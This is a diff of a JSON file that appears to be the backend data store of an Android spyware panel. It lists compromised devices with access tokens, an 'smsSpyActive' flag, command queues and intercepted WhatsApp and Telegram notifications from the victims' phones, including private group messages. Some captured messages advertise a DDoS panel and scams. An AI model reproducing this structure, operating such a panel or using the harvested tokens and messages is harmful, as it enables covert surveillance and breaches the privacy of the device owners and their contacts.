@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778610950,
+    "lastSeen": 1776778614074,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3594 pesan dari 22 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778612710
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (966 pesan): ~ kenzz",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1776776449205
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (959 pesan): ~ ALIF STECU",
-        "content": "Atau hub no",
-        "time": "21/04 20:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776449120
       }
     ],
     "galleryPhotos": [],
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778614160
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778612815
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14386,22 +14402,6 @@
         "time": "21/04 20:27",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778067142
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 20:27",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778067126
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: Rose",
-        "content": "DDOS PANEL GW SUMPAHIN YAPIT",
-        "time": "21/04 20:27",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778066982
       }
     ],
     "galleryPhotos": [],
